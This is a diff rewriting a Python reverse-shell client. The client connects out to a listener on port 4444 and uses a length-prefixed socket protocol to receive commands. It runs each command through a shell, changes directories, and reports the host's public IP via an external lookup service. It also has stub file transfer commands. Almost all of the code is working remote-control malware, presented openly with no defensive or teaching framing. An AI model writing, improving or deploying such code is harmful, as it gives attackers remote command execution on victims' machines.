@@ -1,98 +1,153 @@
+#!/usr/bin/env python
 import os
+import platform
 import socket
-import subprocess
-import threading
 import struct
+import subprocess
 import urllib.request
 import json
 
-
 IP = "127.0.0.1"
 PORT = 4444
-shell = None
+ARC = platform.system()
 
-def execute_command(cmd):
-    """Executes received commands and returns the output."""
-    global shell
-    try:
-        if cmd.lower() == "opencmd":
-            if os.name == "nt":
-                shell = subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            else:
-                shell = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            return "Shell started"
-        elif shell:
-            if cmd.lower() == "exit":
-                shell.stdin.write("exit\n")
-                shell.stdin.flush()
-                shell = None
-                return "Shell closed"
-            
-            shell.stdin.write(cmd + "\n")
-            shell.stdin.flush()
-            output = shell.stdout.readline()
-            return output
+class SendReceive:
+    def __init__(self, sock):
+        self.sock = sock
     
+    def send(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        packed = struct.pack('>I', len(data)) + data
+        self.sock.sendall(packed)
+    
+    def recv(self):
+        data = self.recvall(4)
+        if not data:
+            return b""
+        data_len = struct.unpack(">I", data)[0]
+        return self.recvall(data_len)
+    
+    def recvall(self, n):
+        packet = b''
+        while len(packet) < n:
+            frame = self.sock.recv(n - len(packet))
+            if not frame:
+                return None
+            packet += frame
+        return packet
+
+class ReverseShellClient:
+    def __init__(self, comm):
+        self.comm = comm
+        self.current_dir = os.getcwd()
+        self.old_dir = ""
+        self.alive = True
+    
+    def run_command(self, cmd):
+        try:
+            process = subprocess.Popen(cmd,
+                                     shell=True,
+                                     stdout=subprocess.PIPE,
+                                     stderr=subprocess.PIPE,
+                                     stdin=subprocess.PIPE)
+            output, error = process.communicate(timeout=5)
+            return output + error
+        except subprocess.TimeoutExpired:
+            process.kill()
+            return b"Error: Command timed out"
+        except Exception as e:
+            return f"Error: {e}".encode()
+    
+    def change_directory(self, path):
+        path = path.strip()
+        try:
+            if not path:
+                return f"Current directory: {os.getcwd()}".encode()
             
-        elif cmd.lower() == "getip":
+            if not os.path.isdir(path):
+                return f"cd: No such directory: {path}".encode()
+            
+            self.old_dir = os.getcwd()
+            os.chdir(path)
+            return f"{os.getcwd()}".encode()
+        except Exception as e:
+            return f"cd error: {e}".encode()
+    
+    def get_ip_info(self):
+        try:
             lip = str(socket.gethostbyname(socket.gethostname()))
             res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
             data = json.loads(res.read().decode())
             pip = data.get('ip', 'Unknown')
             output = {
-                "pip":pip,
-                "lip":lip
+                "pip": pip,
+                "lip": lip
             }
-            return json.dumps(output)
+            return json.dumps(output).encode()
+        except Exception as e:
+            return f"Error getting IP info: {e}".encode()
 
-        elif cmd.lower() == "download":
-            return f"{cmd} functionality to be implemented later."
-        
-        elif cmd.lower() == "upload":
-            return f"{cmd} functionality to be implemented later."
-        
-        else:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            return result.stdout if result.stdout else result.stderr
+    def download_file(self, remote_path):
+        return b"download functionality to be implemented later"
 
-    except Exception as e:
-        return f"Error: {e}"
+    def upload_file(self, local_path):
+        return b"upload functionality to be implemented later"
     
-
-def handle_server_commands(sock):
-    """Receives commands from server and sends back output."""
-    while True:
-        try:
-            cmd = sock.recv(1024).decode().strip()
-            if not cmd:
+    def kill_connection(self):
+        """Gracefully terminate the connection"""
+        self.alive = False
+        self.comm.send(b"Terminating connection...")
+        self.comm.sock.close()
+        return b""
+    
+    def handle_connection(self):
+        while self.alive:
+            try:
+                cmd = self.comm.recv().decode().strip()
+                print("Received command:", cmd)  
+                
+                if not cmd:
+                    continue
+                
+                if cmd.startswith("cd "):
+                    path = cmd[3:]
+                    output = self.change_directory(path)
+                elif cmd.lower() == "getip":
+                    output = self.get_ip_info()
+                elif cmd.lower().startswith("download "):
+                    remote_path = cmd[9:].strip()
+                    output = self.download_file(remote_path)
+                elif cmd.lower().startswith("upload "):
+                    local_path = cmd[7:].strip()
+                    output = self.upload_file(local_path)
+                elif cmd.lower() == "kill":
+                    output = self.kill_connection()
+                    break
+                else:
+                    output = self.run_command(cmd)
+                
+                self.comm.send(output)
+            
+            except (socket.error, KeyboardInterrupt):
+                self.kill_connection()
                 break
+            except Exception as e:
+                self.comm.send(f"Unhandled error: {e}".encode())
 
-            output = str(execute_command(cmd))  
-            #print("Output: ",output)
-            if cmd.lower() in ["getip"]: 
-                sock.sendall(output.encode())  
-            else: 
-                sock.sendall(struct.pack('>I', len(output.encode())) + output.encode())
-
-        except (Exception, socket.error) as e:
-            sock.sendall(f"Error: {e}".encode())
-            break
-    socket.close()
-
-def start_client(ip, port):
+def main():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((ip, port))
-
-        print(f"Connected to {ip}:{port}")
-
-        thread = threading.Thread(target=handle_server_commands, args=(sock,))
-        thread.daemon = True
-        thread.start()
-
-        thread.join()
-    except KeyboardInterrupt:
-        sock.close()
+        sock.connect((IP, PORT))
+        print("Connected to server...")
+        
+        comm = SendReceive(sock)
+        client = ReverseShellClient(comm)
+        client.handle_connection()
+    
+    except Exception as e:
+        print(f"Connection error: {e}")
+        exit(1)
 
 if __name__ == "__main__":
-    start_client(IP, PORT)
+    main()
